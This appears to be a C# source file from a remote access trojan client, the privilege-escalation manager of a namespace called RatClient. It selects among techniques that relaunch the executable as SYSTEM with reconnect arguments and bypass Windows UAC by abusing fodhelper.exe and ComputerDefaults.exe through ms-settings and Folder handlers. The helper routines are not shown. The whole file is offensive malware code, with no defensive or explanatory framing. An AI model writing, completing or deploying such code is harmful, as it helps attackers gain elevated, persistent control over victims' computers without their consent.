

namespace RatClient.PrivEsc
{
    class Manager
    {
        public static bool Escalate(string type)
        {
            bool status = false;
            if (type == null)
            {
                return status;
            }
            else if (type == "getsystemspwanparent")
            {
                if (Tools.StartAsSpawnedSystem(Info.CurrentexecutablePath, arguments:" -noexit -reconnect"))
                {
                    status = true;
                }
            }
            else if(type == "fodhelpermssetting")
            {
                status = ActionsTools.UacBypassMsSetting("fodhelper.exe", "ms-settings");
            }
            else if( type == "computerdefaultsmssetting")
            {                                                                   
                status = ActionsTools.UacBypassMsSetting("ComputerDefaults.exe", "Folder");
            }
            return status;
        }
    }
}
